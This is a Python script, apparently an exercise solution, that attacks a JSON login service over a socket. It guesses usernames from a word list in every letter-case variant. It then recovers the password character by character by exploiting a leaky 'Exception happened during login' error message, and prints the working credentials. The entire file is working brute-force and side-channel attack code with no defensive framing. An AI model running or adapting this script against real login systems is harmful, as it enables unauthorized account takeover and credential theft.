import itertools
import json
import socket
import sys


def get_set(line):
    chars = []
    for ch in line.strip():
        if ch.isalpha():
            chars.append((ch.lower(), ch.upper()))
        else:
            chars.append(tuple(ch))
    return itertools.product(*chars)


ip = sys.argv[1]
port = int(sys.argv[2])
with socket.socket() as client:
    client.connect((ip, port))
    found = False
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    with open('hacking/logins.txt') as logins:
        for name in logins:
            if found:
                break
            names = get_set(name)
            for chars in names:
                if found:
                    break
                login = ''.join(chars)
                password = ' '
                msg = {'login': login, 'password': password}
                json_str = json.dumps(msg)
                client.send(json_str.encode())
                response = json.loads(client.recv(10240).decode())
                if response['result'] == 'Wrong password!':
                    password = ''
                    while response['result'] != 'Connection success!':
                        for c in characters:
                            msg['password'] = password + c
                            json_str = json.dumps(msg)
                            client.send(json_str.encode())
                            response = json.loads(client.recv(10240).decode())
                            if response['result'] == "Exception happened during login":
                                password += c
                            elif response['result'] == 'Connection success!':
                                print(json_str)
                                found = True
                                break
